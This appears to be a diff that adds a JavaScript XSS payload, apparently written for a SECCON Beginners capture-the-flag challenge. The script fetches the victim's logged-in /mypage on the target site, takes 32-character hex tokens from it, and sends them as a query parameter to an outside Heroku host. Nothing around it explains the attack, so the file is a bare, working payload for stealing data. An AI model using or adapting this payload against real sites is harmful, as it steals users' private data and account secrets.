@@ -1,0 +1,22 @@
+<script>
+const run = async () => {
+  let content;
+
+  try {
+    const resp = await fetch("https://himitsu.quals.beginners.seccon.jp/mypage");
+    content = await resp.text();
+    content = content.match(/[0-9a-f]{32}/g).join();
+  } catch (err) {
+    content = err.stack || err.message;
+  }
+
+  const urlObj = new URL("https://sheltered-peak-12710.herokuapp.com/");
+  const params = new URLSearchParams();
+  params.append("d", content);
+  urlObj.search = params.toString();
+
+  await fetch(urlObj.toString());
+};
+
+run();
+</script>
